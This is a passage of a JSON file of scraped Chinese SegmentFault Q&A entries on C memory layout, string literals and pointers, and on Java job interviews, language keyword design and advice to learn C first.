      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003710855\">\n<p>每一个进程都有自己的内存虚拟地址空间,内存最小的单位是页(page).<br>虚拟地址通过页表(Page Table)映射到物理内存,页表由操作系统维护并被CPU引用.<br>Linux默认的栈(stack)大小为8MB.</br></br></p>\n<p>用户进程部分分段存储内容如下所示(从内存高地址到低地址):<br>栈(stack): 函数参数、返回地址、局部变量等<br>堆(heap): malloc(C)/new(C++)动态分配的内存<br>BSS段(bss): 未初始化或初值为0的全局变量和静态局部变量<br>数据段(data): 已初始化且初值非0的全局变量和静态局部变量<br>代码段(text): 可执行代码、字符串字面值、只读变量</br></br></br></br></br></p>\n<p>详细解释:</p>\n<p>1.内核空间<br>内核总是驻留在内存中，是操作系统的一部分。内核空间为内核保留，不允许应用程序读写该区域的内容或直接调用内核代码定义的函数。</br></p>\n<p>2.栈(stack)<br>栈又称堆栈，由编译器自动分配释放，行为类似数据结构中的栈(先进后出)。<br>堆栈主要有三个用途：<br>(1)为函数内部声明的非静态局部变量(C语言中称“自动变量”)提供存储空间。<br>(2)记录函数调用过程相关的维护性信息，称为栈帧(Stack Frame)或过程活动记录(Procedure Activation Record)。<br>它包括函数返回地址，不适合装入寄存器的函数参数及一些寄存器值的保存。<br>除递归调用外，堆栈并非必需。因为编译时可获知局部变量，参数和返回地址所需空间，并将其分配于BSS段。<br>(3)临时存储区，用于暂存长算术表达式部分计算结果或alloca()函数分配的栈内内存。</br></br></br></br></br></br></br></p>\n<p>持续地重用栈空间有助于使活跃的栈内存保持在CPU缓存中，从而加速访问。<br>进程中的每个线程都有属于自己的栈。<br>向栈中不断压入数据时，若超出其容量就会耗尽栈对应的内存区域，从而触发一个页错误。<br>此时若栈的大小低于堆栈最大值RLIMIT_STACK(Linux通常是8M)，则栈会动态增长，程序继续运行。<br>映射的栈区扩展到所需大小后，不再收缩。<br>Linux中ulimit -s命令可查看和设置堆栈最大值，当程序使用的堆栈超过该值时, 发生栈溢出(Stack Overflow)，程序收到一个段错误(Segmentation Fault)。<br>注意，调高堆栈容量可能会增加内存开销和启动时间。<br>堆栈既可向下增长(向内存低地址)也可向上增长, 这依赖于具体的实现。本文所述堆栈向下增长。<br>堆栈的大小在运行时由内核动态调整。</br></br></br></br></br></br></br></br></p>\n<p>3.内存映射段(mmap)<br>此处，内核将硬盘文件的内容直接映射到内存，任何应用程序都可通过Linux的mmap()系统调用<br>或Windows的CreateFileMapping()/MapViewOfFile()请求这种映射。<br>内存映射是一种方便高效的文件I/O方式，因而被用于装载动态共享库。<br>用户也可创建匿名内存映射，该映射没有对应的文件，可用于存放程序数据。<br>在Linux中，若通过malloc()请求一大块内存，C运行库将创建一个匿名内存映射，而不使用堆内存。<br>“大块”意味着比阈值MMAP_THRESHOLD还大，缺省为128KB，可通过mallopt()调整。<br>该区域用于映射可执行文件用到的动态链接库。<br>在Linux 2.4内核中，若可执行文件依赖共享库，则系统会为这些动态库在从0x40000000开始的地址分配相应空间，并在程序装载时将其载入到该空间。<br>在Linux 2.6内核中，共享库的起始地址被往上移动至更靠近栈区的位置。<br>从进程地址空间的布局可以看到，在有共享库的情况下，留给堆的可用空间还有两处：<br>一处是从BSS段到0x40000000，约不到1GB的空间；另一处是从共享库到栈之间的空间，约不到2GB。<br>这两块空间大小取决于栈、共享库的大小和数量。这样来看，是否应用程序可申请的最大堆空间只有2GB？<br>事实上，这与Linux内核版本有关。<br>在上面给出的进程地址空间经典布局图中，共享库的装载地址为0x40000000，这实际上是Linux kernel 2.6版本之前的情况了，<br>在2.6版本里，共享库的装载地址已经被挪到靠近栈的位置，即位于0xBFxxxxxx附近，<br>因此，此时的堆范围就不会被共享库分割成2个“碎片”，故kernel 2.6的32位Linux系统中，malloc申请的最大内存理论值在2.9GB左右。</br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></p>\n<p>4.堆(heap)<br>堆用于存放进程运行时动态分配的内存段，可动态扩张或缩减。<br>堆中内容是匿名的，不能按名字直接访问，只能通过指针间接访问。<br>当进程调用malloc(C)/new(C++)等函数分配内存时，新分配的内存动态添加到堆上(扩张)；<br>当调用free(C)/delete(C++)等函数释放内存时，被释放的内存从堆中剔除(缩减) 。<br>分配的堆内存是经过字节对齐的空间，以适合原子操作。<br>堆管理器通过链表管理每个申请的内存，由于堆申请和释放是无序的，最终会产生内存碎片。<br>堆内存一般由应用程序分配释放，回收的内存可供重新使用。<br>若程序员不释放，程序结束时操作系统可能会自动回收。<br>堆的末端由break指针标识，当堆管理器需要更多内存时，可通过系统调用brk()和sbrk()来移动break指针以扩张堆，一般由系统自动调用。<br>使用堆时经常出现两种问题：<br>(1) 释放或改写仍在使用的内存(“内存破坏”)；<br>(2) 未释放不再使用的内存(“内存泄漏”)。当释放次数少于申请次数时，可能已造成内存泄漏。<br>泄漏的内存往往比忘记释放的数据结构更大，因为所分配的内存通常会圆整为下个大于申请数量的2的幂次(如申请212B，会圆整为256B)。<br>注意，堆不同于数据结构中的”堆”，其行为类似链表。</br></br></br></br></br></br></br></br></br></br></br></br></br></br></p>\n<p>5.BSS段<br>BSS(Block Started by Symbol)段中通常存放程序中以下符号：<br>未初始化的全局变量和静态局部变量.<br>初始值为0的全局变量和静态局部变量(依赖于编译器实现).<br>未定义且初值不为0的符号(该初值即common block的大小).<br>C语言中，未显式初始化的静态分配变量被初始化为0(算术类型)或空指针(指针类型)。<br>由于程序加载时，BSS会被操作系统清零，所以未赋初值或初值为0的全局变量都在BSS中。<br>BSS段仅为未初始化的静态分配变量预留位置，在目标文件中并不占据空间，这样可减少目标文件体积。<br>但程序运行时需为变量分配内存空间，故目标文件必须记录所有未初始化的静态分配变量大小总和(通过start_bss和end_bss地址写入机器代码)。<br>当加载器(loader)加载程序时，将为BSS段分配的内存初始化为0。<br>在嵌入式软件中，进入main()函数之前BSS段被C运行时系统映射到初始化为全零的内存(效率较高)。<br>注意，尽管均放置于BSS段，但初值为0的全局变量是强符号，而未初始化的全局变量是弱符号。<br>若其他地方已定义同名的强符号(初值可能非0)，则弱符号与之链接时不会引起重定义错误，但运行时的初值可能并非期望值(会被强符号覆盖)。<br>因此，定义全局变量时，若只有本文件使用，则尽量使用static关键字修饰；否则需要为全局变量定义赋初值(哪怕0值)，<br>保证该变量为强符号，以便链接时发现变量名冲突，而不是被未知值覆盖。<br>某些编译器将未初始化的全局变量保存在common段，链接时再将其放入BSS段。<br>在编译阶段可通过-fno-common选项来禁止将未初始化的全局变量放入common段。<br>此外，由于目标文件不含BSS段，故程序烧入存储器(Flash)后BSS段地址空间内容未知。<br>U-Boot(一个嵌入式操作系统引导程序)启动过程中，将U-Boot的Stage2代码(通常位于lib_xxxx/board.c文件)<br>搬迁(拷贝)到SDRAM空间后必须人为添加清零BSS段的代码，而不可依赖于Stage2代码中变量定义时赋0值。<br>BSS段不包含数据，仅维护开始和结束地址，以便内存能在运行时被有效地清零。<br>BSS所需的运行时空间由目标文件记录，但BSS并不占用目标文件内的实际空间，即BSS节段应用程序的二进制映象文件中并不存在。</br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></p>\n<p>6.数据段(data)<br>数据段通常用于存放程序中已初始化且初值不为0的全局变量和静态局部变量。<br>数据段属于静态内存分配(静态存储区)，可读可写。<br>数据段保存在目标文件中(在嵌入式系统里一般固化在镜像文件中)，其内容由程序初始化。<br>例如，对于全局变量int gVar = 10，必须在目标文件数据段中保存10这个数据，然后在程序加载时复制到相应的内存。<br>数据段与BSS段的区别如下： <br>(1) BSS段不占用物理文件尺寸，但占用内存空间；数据段占用物理文件，也占用内存空间。<br>对于大型数组如int ar0[10000] = {1, 2, 3, ...}和int ar1[10000]，<br>ar1放在BSS段，只记录共有10000*4个字节需要初始化为0，而不是像ar0那样记录每个数据1、2、3...，此时BSS为目标文件所节省的磁盘空间相当可观。<br>(2) 当程序读取数据段的数据时，系统会发出缺页故障，从而分配相应的物理内存；<br>当程序读取BSS段的数据时，内核会将其转到一个全零页面，不会发生缺页故障，也不会为其分配相应的物理内存。<br>运行时数据段和BSS段的整个区段通常称为数据区。某些资料中“数据段”指代数据段 + BSS段 + 堆。</br></br></br></br></br></br></br></br></br></br></br></p>\n<p>7.代码段(text)<br>代码段也称正文段或文本段，通常用于存放程序执行代码(即CPU执行的机器指令)。<br>一般C语言执行语句都编译成机器代码保存在代码段。<br>通常代码段是可共享的，因此频繁执行的程序只需要在内存中拥有一份拷贝即可。<br>代码段通常属于只读，以防止其他程序意外地修改其指令(对该段的写操作将导致段错误)。<br>某些架构也允许代码段为可写，即允许修改程序。<br>代码段指令根据程序设计流程依次执行，对于顺序指令，只会执行一次(每个进程)；若有反复，则需使用跳转指令；若进行递归，则需要借助栈来实现。<br>代码段指令中包括操作码和操作对象(或对象地址引用)。若操作对象是立即数(具体数值)，将直接包含在代码中；<br>若是局部数据，将在栈区分配空间，然后引用该数据地址；若位于BSS段和数据段，同样引用该数据地址。<br>代码段最容易受优化措施影响。</br></br></br></br></br></br></br></br></br></p>\n<p>8.保留区(reservd)<br>位于虚拟地址空间的最低部分，未赋予物理地址。任何对它的引用都是非法的，用于捕捉使用空指针和小整型值指针引用内存的异常情况。<br>它并不是一个单一的内存区域，而是对地址空间中受到操作系统保护而禁止用户进程访问的地址区域的总称。<br>大多数操作系统中，极小的地址通常都是不允许访问的，如NULL。<br>C语言将无效指针赋值为0也是出于这种考虑，因为0地址上正常情况下不会存放有效的可访问数据。<br>在32位x86架构的Linux系统中，用户进程可执行程序一般从虚拟地址空间0x08048000开始加载。<br>该加载地址由ELF文件头决定，可通过自定义链接器脚本覆盖链接器默认配置，进而修改加载地址。<br>0x08048000以下的地址空间通常由C动态链接库、动态加载器ld.so和内核VDSO(内核提供的虚拟共享库)等占用。<br>通过使用mmap系统调用，可访问0x08048000以下的地址空间。</br></br></br></br></br></br></br></br></p>\n<p>更多:<br>Linux虚拟地址空间布局<br><a href=\"http://www.cnblogs.com/clover-toeic/p/3754433.html\">http://www.cnblogs.com/clover-toeic/p/3754433.html</a></br></br></p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003705048\">\n<p>如何全面理解使用动态内存导致进程比使用堆栈内存慢？<br>自动变量使用的内存栈区分配的内存，而动态内存分配所用的内存是由堆区分配的内存</br></p>\n</div>",
      "favourite": "5",
      "glance": "1.2k",
      "tags": [
        "c"
      ],
      "time": "2015-09-04",
      "title": "如何全面理解使用动态内存导致进程比使用堆栈内存慢？",
      "url": "https://segmentfault.com/q/1010000003705048"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003716173\">\n<p>关键字<strong>restrict</strong>导致memcpy中s1和s2内存之间没有交叠，我知道使用了restrict关键字说明该指针是访问该数组的唯一方式，内存区域一旦交叠，肯定会有意想不到的结果出现，但是，在使用memcpy函数时，是如何知道s1和s2之间没有内存交叠呢？</p>\n</div>",
      "favourite": "0",
      "glance": "572",
      "tags": [
        "c"
      ],
      "time": "2015-09-07",
      "title": "关于memcpy（void *restrict s1,const void *restrict s2,size_t n）的疑惑",
      "url": "https://segmentfault.com/q/1010000003716173"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003747393\">\n<pre><code class=\"c\">int main(int argc, char **argv)\n{\n    int a[4] = {1, 2, 3, 4};\n    int *ptr = (int *)(&amp;a + 1);\n    printf(\"%d\", *(ptr - 1));\n}</code></pre>\n<p>以下代码输出什么？<br>看了输出，不明白为何.</br></p>\n</div>",
      "favourite": "2",
      "glance": "575",
      "tags": [
        "c"
      ],
      "time": "2015-09-15",
      "title": "C语言数组问题",
      "url": "https://segmentfault.com/q/1010000003747393"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003796136\">\n<p>指针初始化时定义了一个指针指向常量地址，而数组初始化时是该数组申请了地址空间用于存储常量字符串的内容。因此，前者不可变，而后者是可变的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003833726\">\n<p>数组的字符串内存属于<code>栈</code>, 所以是<code>可读可写</code>;<br>指针的字符串内存属于<code>代码块</code>, 只<code>可读</code>, 这个地址程序运行后一直存在且不变.</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003834369\">\n<html><body>\n<p>编译器就是这么做的，记住就行了，不必太纠结。<br>对linux来说，程序加载后内存是分段的。<br><img data-src=\"/img/bVqfDC\"><br>对于<code>char *c=\"abc\"</code>;程序启动时直接加载到了.data段。当你再定义一个<code>char *d=\"abc\"</code>时，这两个指针公用一块内存。因此你不能随便改这里的内容，它是共享的，只读的。<br>你就理解成编译器共享常量字符串为了省内存吧。<br>但是对于<code>char a[]=\"abc\"</code>;这种定义是在程序执行时，动态在stack段申请的，因此a,b两个指针的地址不一样。就只有你一个人用，而且函数返回后就销毁了。栈上的内存都是可以随便更改的。</br></br></br></img></br></br></p>\n<p>验证：</p>\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    char a[]=\"abc\";\n    char b[]=\"abc\";\n    \n    char *c=\"abc\";\n    char *d=\"abc\";\n    \n    printf(\"%p\\n\", a);\n    printf(\"%p\\n\", b);\n    printf(\"%p\\n\", c);\n    printf(\"%p\\n\", d);\n}</code></pre>\n<p>结果：</p>\n<pre><code>@ ➜  ~  ./a.out\n0x7fff52ac3afc\n0x7fff52ac3af8\n0x10d13cf8a\n0x10d13cf8a</code></pre>\n</body></html>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003796104\">\n<p>直接用数组初始化：</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n\nint main(void) {\n  char str[] = \"abc\";\n  int i = 0;\n  while (str[i] != '\\0') {\n    printf(\"%c\\n\", str[i]);\n    i++;\n  }\n\n  str[1] = 'd';\n\n  return 0;\n}\n</code></pre>\n<p>没有问题，正常输出，没有报错。</p>\n<p>但是如果用指针初始化：</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n\nint main(void) {\n  char *str = \"abc\";\n  int i = 0;\n  while (str[i] != '\\0') {\n    printf(\"%c\\n\", str[i]);\n    i++;\n  }\n\n  str[1] = 'd';\n\n  return 0;\n}\n</code></pre>\n<p>它执行到 <code>str[1] = 'd'</code> 的时候，就会报 segmentation fault，我在网上搜了一下，<br>都是说通过指针初始化的字符串是个常量，不能改变。感觉这个很坑啊，只是 <code>char str[] = \"abc\"</code> 和 <code>char *str = \"abc\";</code> 这样小的区别而已，为什么通过指针初始化的那个就要是常量呢？是 C 语言规定就是这样，还是是可以理解的？</br></p>\n</div>",
      "favourite": "4",
      "glance": "761",
      "tags": [
        "c",
        "字符串",
        "指针"
      ],
      "time": "2015-09-26",
      "title": "C 语言字符串用数组和指针初始化为什么会有这样的区别？",
      "url": "https://segmentfault.com/q/1010000003796104"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003840697\">\n<p>其实<code>\\</code>是为了进行字符转义，<code>\\\"</code>中的<code>\\</code>是为了对<code>\"</code>进行转义。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003832290\">\n<p>字符串最后两个引号\"\"是代表什么?</p>\n<p>其中前一个是\\\"，是字符串双引号里，字符串内容用到引号时表达方式</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003812374\">\n<p>优先级问题，简而言之，就是str[3]是<code>\\012</code>不是<code>\\0</code>。</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003811088\">\n<p>c语言字符串问题<br>printf(\"%d\",strlen(str));<br>上面程序片段的输出结果是 6</br></br></p>\n</div>",
      "favourite": "0",
      "glance": "642",
      "tags": [
        "c",
        "c语言"
      ],
      "time": "2015-09-30",
      "title": "c语言字符串问题",
      "url": "https://segmentfault.com/q/1010000003811088"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003842520\">\n<p>一道笔试题，时间复杂度要求O(N)<br>int数组中有三个元素出现的次数超过元素总个数的1/4,在规定时间复杂度下，求出这三个数。<br>我的思路，交卷的一刹那，我发现自己考虑非常不全面。<br>定义三个变量，保存三个数，在定义三个计数器，开始把a[0],a[1],a[2]赋给三个变量（这里有问题，万一重复了），然后对后面的数组扫描，出现相等的计数器加一，不相等计数器减一。</br></br></br></p>\n<p>已经通知下午2点面试，晚上再跟大家探讨下，这题其实跟数组中有元素超过数组一半是一类问题吧，可能考虑起来要复杂点。</p>\n<p>请用C/C++实现，Java我不熟。</p>\n</div>",
      "favourite": "0",
      "glance": "524",
      "tags": [
        "c"
      ],
      "time": "2015-10-11",
      "title": "重复元素问题",
      "url": "https://segmentfault.com/q/1010000003842520"
    }
  ],

  "java": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000258585\">\n<p>有些公司笔试是编程题的。\n腾讯和笔试比较简单，只要基础知识比较扎实的一般都没有太大问题，面试有好多轮，会问技术问题。\n我今年刚毕业，最大的遗憾就是没有多参加几次面试（大三的时候找了一家公司），建义如果有机会多参加几次面试，然后等到你想去的公司的时候，你就有经验了。供参考。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000258775\">\n<p>好吧，马上离开腾讯了，趁着还能做点贡献上来答一个呵呵。<br/>\n<strong>1.企业面试应届生的时候会要求现场编写代码吗</strong><br/>\n看面试官，一般都会要求写点，但是都是基础的数据结构和算法题，哪些是基础的相信不用我说了，数据结构书上都有，当然在现场写对面是面试官必然是有可能紧张的，万一写不出来也别放弃，可以和面试官多聊聊实现的原理就ok，原理都知道了，实现只是时间问题。<br/>\n<strong>2.希望成为 Java 工程师，不熟悉 C 和 C++ 对笔试面试有多大影响？（笔试会考C/C++吗）</strong><br/>\n据我所知应该会有分语言的笔试卷，而且事实上编程语言的选择一般不会是问题，我甚至面试一家公司，求职的C++后台结果面试官用javascrupt让我写，偏题了。如果试卷是C++的没有你想要的java我觉得也没关系，笔试卷有很大一部分是考原理的，不需要实际编程，而真实的编程题如果你C++确实不熟悉，用java写的话人家应该也能看懂。所以不用担心，笔试只是删除那些完全没水平的面试者。<br/>\n<strong>3.希望进搜狐、腾讯这种级别的公司，要做什么准备？</strong><br/>\n打好基础，简历上写的东西一定要心里有数，不要为了增加内容就随便填加。我记得我毕业面试TX时写了句对linux内核有所了解，结果被面试官往这方面问，还好答出来了，所以千万要实事求是。<br/>\n附加地答一点吧：腾讯的面试还是很开放的，不要有任何紧张情绪，给面试官留一个自信阳光的印象是非常好的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000258913\">\n<p>这是每个应届毕业生的困惑。</p>\n<hr/>\n<p>作为一名面试官，我很少面试语言的细节，这些都是可以通过看书或者手册学习到的。我比较喜欢看应聘者<strong>解决问题的能力</strong>。</p>\n<p>原文太长，就不贴出来了。<a href=\"http://justjavac.com/codepuzzle/2012/11/02/codepuzzle-float-from-surprised-to-ponder.html\" rel=\"nofollow\">一次关于浮点数的面试</a>。</p>\n<p>很多毕业生都<strong>把计算机学成了文科</strong>，他们不是在学习理论知识，而是被动接受/背诵记忆这些知识。他们来公司，编程只是他们的工作而已，聘用他们的真正目的是<strong>解决问题</strong>，用程序解决很多人共性的问题。</p>\n<p>我面试时，他们可以使用任何工具甚至Google，当然，我出的题目一般都不能直接个Google到，虽然网上没有现成的答案，但是可以总结出答案。我的观点是，如果你的任何问题都可以用Google<strong>直接</strong>解决，你不可能成为一名特别优秀的程序员。</p>\n<p>你搜索到的是<strong>数据</strong>，即使你保存在了evernote，说白了就是01串，你阅读了，思考了，这些数据就变成了<strong>信息</strong>，0101010…11101 编程了 int a = 4; 你再继续思考，使用，深化，这些信息就变成了<strong>知识</strong>。 你会说：『哦，这不是李氏代换原则吗？』</p>\n<p>最后重申一下：<strong>学历代表过去，能力代表现在，学习能力代表将来</strong></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000258551\">\n<p>本人是应届生，马上要找工作了，想找软件工程的工作。迷惑比较多，希望前辈们能传道解惑：<br/>\n1.企业面试应届生的时候会要求现场编写代码吗？<br/>\n2.希望成为 Java 工程师，不熟悉 C 和 C++ 对笔试面试有多大影响？（笔试会考C/C++吗）<br/>\n3.希望进搜狐、腾讯这种级别的公司，要做什么准备？</p>\n</div>",
      "favourite": "8",
      "glance": "7.2k",
      "tags": [
        "java",
        "面试",
        "面试题"
      ],
      "time": "2013-07-27",
      "title": "企业面试应届生的时候会要求现场编写代码吗？",
      "url": "https://segmentfault.com/q/1010000000258551"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000668437\">\n<p><code>function</code>是个标记，表明正在声明的是一个函数，这个关键字和编译型或解释型没什么太大关系，使用这个关键字的大多是<strong>动态类型</strong>语言，对于C/JAVA这一类<strong>静态类型</strong>语言，标明返回值和参数列表就可以明确的区分<strong>函数声明</strong>和<strong>函数调用</strong>，因为函数本身和参数都标明了类型，但动态类型的语言没有类型表示，如果不加入一个特定的关键字，从语法上就不太好区分<strong>函数声明</strong>和<strong>函数调用</strong>，比如C语言中：<br><code>int f(int n)</code>是一个声明，<code>f(n)</code>是一个调用，但在JavaScript中，如果你不加<code>function</code>这个关键字，你该如何解释<code>f(n)</code>到底是什么呢？</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000670780\">\n<p>问一个问题, 请问 \"打\" 的正确含义是什么?</p>\n<p>任何人都不应该给出正确的答案, 因为你不知道它被作为动词还是量词, 或者其他意思.</p>\n<p>所以我们需要从 \"一打\" \"打手\" \"打开\" 这样的上下文中分析该词的含义.</p>\n<p>至于 function 这个关键词需不需要出现, 取决于语言的设计.</p>\n<p>合格的程序员都知道代码文本, 经过编译之后, 最终成为机器码或者 vm 用的字节码, 所以跟你写不写 <code>function</code> 没有关系. <code>function</code> 之类的关键字方便在编译前的分析阶段, 能够正确(并且实现上不那么费力)地通过语法和语义分析.</p>\n<p>举个例子, 在 5.4 之前, php 不支持 <code>abc()[1]</code> 这种对函数返回值取数组索引(前提是得保证返回了理想长度的数组), 鸟哥给的原因(记不清了,估计是他)是解析代码比较乱, 比较难实现, 到 5.4, 总算有人愿意干这个脏活了, 解决了这个问题. 如果哪天谁把 function 这个关键字的解析工作优化了, 那么可能就会出现一个不需要 <code>function</code> 关键字的 php.</p>\n<p>举个栗子, 因为语法被很多人讨厌的 bash<br>\n函数定义如下</br></p>\n<pre><code> [ function ] name () compound-command [ redirections ]\n</code></pre>\n<p>定义函数的的时候, <code>function</code> 关键字是可选的, 但, 没有 <code>function</code> 的时候, 需要写上 <code>()</code><br>\n所以, 意味着 bash 通过 function 或者 () 来定位这是一个函数声明, 而不是语句.</br></p>\n<p>更加准确的回答, 需要从语言的解析具体实现进行分析, 另外还要确定是否存在和 <code>abc(){}</code> 冲突的特性存在, 就不继续深入了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000668560\">\n<p>很赞的一个问题。</p>\n<p>我也看过很多语言源代码，也对不同的语言的语法感兴趣，所以简单的聊聊这个问题。</p>\n<p>首先出场的是 LISP 语言。 LISP 语言以逼格高闻名于世。他属于函数式编程语言，所有的语句都是函数，因此不需要 function 这个关键词。</p>\n<p>随后的 Fortran 语言，公式翻译的意思 <strong>For</strong>mula<strong>Tran</strong>slation。既然是公式翻译语言，因此 数学公式 f(x) = a + b 在 Fortran 的调用就是 <code>x = a + b</code>。</p>\n<p>在定义函数的方式上，使用 function：（代码来自google）</p>\n<pre><code class=\"lang-fortran\">function add(a, b)\nimplicit none\nreal::a, b    !声明函数参数类型，这是必需的\nreal::add     !声明函数返回值类型，这是必需的\nadd = a + b   !返回值的表达式\nreturn\nend\n</code></pre>\n<p>COBOL语言。COBOL 设计的目的和 Fortran 不同，甚至连赋值语句都没有，而且根本就没有函数的概念，取而代之的是 PROCEDURE DIVISION（过程）。</p>\n<p>随后就是 Basic：<strong>B</strong>eginner's <strong>A</strong>ll-purpose <strong>S</strong>ymbolic <strong>I</strong>nstruction <strong>C</strong>ode。Basic 可谓是集大成者，不仅仅有函数，还有过程。函数使用 function， 过程使用 sub。（抄袭 fortran 和 cobol？）</p>\n<p>C语言改变了这种局面，原因是C语言的一个独辟蹊径的设计理念：函数如何调用，就如何声明。也就是说，我们如果这样调用函数</p>\n<pre><code>sum = f(a, b);\n</code></pre>\n<p>那么，我们就这么声明：</p>\n<pre><code>double f(a, b)     /* 旧式语法 */\n    double a;\n    double b;\n{}\n\ndouble f(double a, double b)  // 新式语法\n{}\n</code></pre>\n<p>随后的 C++ Java C# 走的是C的路线。</p>\n<p>但是<strong>调用和声明一致</strong>的前提是，函数调用之前需要声明。在 C 语言中，不仅仅是函数，即使数据类型定义也需要声明。</p>\n<p>不过在很多动态语言中，大部分数据和函数都不需要提前声明，而且有很多函数只调用一次，那么在函数调用之前声明一次，以后这个函数就再不使用了，这样就会显得繁琐。这时，就需要在语法上将函数定义和函数调用分别出来。</p>\n<p>还有一个原因，C是种编译性的语言，他的语法是为了更好的提升编译速度和编译完成后的代码性能，比如早期C和pascal编译器要求的数据和代码分离的原则。</p>\n<p>而现在的主要动态编程语言都不再需要编译，更无需预编译。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000668429\">\n<p>我看了很多语言源代码，突然发现一个有趣的现象，对于<code>function</code>这个关键字，很多语言设计出来了，而很多语言却没有。这是基于一种什么考虑呢？</p>\n<p>而且经过我的统计，出现<code>function</code>关键字的大多数是脚本语言，比如<code>php</code>,<code>js</code>等等，而编译式语言比如<code>java</code>,<code>c</code>等等，往往却没有用到这个关键字，这其中有什么内在联系吗？</p>\n</div>",
      "favourite": "12",
      "glance": "3.3k",
      "tags": [
        "编程语言",
        "php",
        "javascript",
        "java",
        "c"
      ],
      "time": "2014-09-15",
      "title": "为何有的语言要声明function关键字，有的却不需要呢？",
      "url": "https://segmentfault.com/q/1010000000668429"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000214551\">\n<p>说说我的看法，一家之言，仅供参考。 </p>\n<p>我在学校读书的时候，最开始接触的是C，仅限于学习。后面又接触了C++，同样是个人兴趣。后来读研的时候，由于实验室项目的需要，重新学习了C++，再后来，出于同样的目的，学了Java。毕业之后，本来打算找C++方面的开发，阴差阳错，进入现在的公司，工作中又是Java服务器端开发。工作之余，随着个人兴趣，又学了Python，Scala，JS，但仅限于自己做做自己感兴趣的东西。  </p>\n<p>啰嗦了这么一大堆，只是为了以自己亲身经历说明了一个观点：学习语言的时候，不要纠结着自己到底是学A还是学B，重要的是带着目标，或者说需求去学，目标驱动是最有效的！  </p>\n<p>此外，看了你的评论说第一门语言很重要。对于第一门语言是否重要，我的观点是：是很重要，但不起决定性作用，重要的是行动！而且对于你以后想以编程为职业，很大可能你工作的编程语言不是你的第一门语言，而且作为一个coder，你也不应该局限于一门语言！</p>\n<p>最后，如果你还在学校的话，不要仅关注语言，语言只是载体，重要的还是数据结构、算法、编程思想这些本质性的东西。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000240391\">\n<p>先学 C 吧，毕竟是系统语言，对底层涉及的比较多。</p>\n<p>同意 @justjavac 的那句话</p>\n<blockquote>\n<p>越容易掌握的东西，学习的人越多，而且淘汰得越快</p>\n</blockquote>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000240383\">\n<p><strong>程序员之路——一个老程序员对刚上大学的学弟学妹的忠告</strong><br/>\n原文地址：<a href=\"http://blog.csdn.net/justjavac/article/details/7998856\" rel=\"nofollow\">http://blog.csdn.net/justjavac/article/details/7998856</a></p>\n<p><strong>先学C语言</strong></p>\n<p>始终认为，<strong>对一个初学者来说，IT界的技术风潮是不可追赶</strong>。 我时常看见自己的DDMM们把课本扔了，去买些价格不菲的诸如C#, VB.Net 这样的大部头，这让我感到非常痛心。 而许多搞不清指针是咋回事的BBS站友眉飞色舞的讨论C#里面可以不用指针等等则让我觉得好笑。</p>\n<p>C#就象当年的ASP 一样，“忽如一夜春风来，千树万树梨花开”，结果许多学校的信息学院成了“Web 学院”。 96, 97级的不少大学生都去做Web了。当然我没有任何歧视某一行业的意识。 我只是觉得如果他们<strong>把追赶这些时髦技术的时间多花一点在基础的课程上应该是可以走得更远的</strong>。</p>\n<h2>几个误区</h2>\n<p>初学者对C#风潮的追赶其实也只是学习过程中经常遇到的几个误区之一。 我将用一些实际的例子来说明这些现象，你可以按部就班的看看自己是不是属于其中的一种或者几种：</p>\n<h3>认为计算机技术等于编程技术：</h3>\n<p>有些人即使没有这个想法，在潜意识中也有这样的冲动。 让我奇怪的是，许多信息学院的学生也有这样的念头。 认为计算机专业就是编程专业，与编程无关的，或者不太相关课程他统统都不管，极端的学生只要书上没带“编程”两个字他就不看。</p>\n<p>其实编程只是计算机技术应用过程中一种复杂性最低的劳动，这就是为什么<strong>IT业最底层的人是程序员（CODER）</strong>。 计算机技术包括了多媒体，计算机网络，人工智能，模式识别，管理信息系统等等这些方面。 编程工作只是在这些具体技术在理论研究或者工程实践的过程中表达算法的过程。</p>\n<p>编程的人不一定对计算机技术的了解就一定很高。而一个有趣的现象是，不少大师级的计算机技术研究者是不懂编程的。 网上的炒作和现实中良好的工作待遇把编程这种劳动神秘化了。 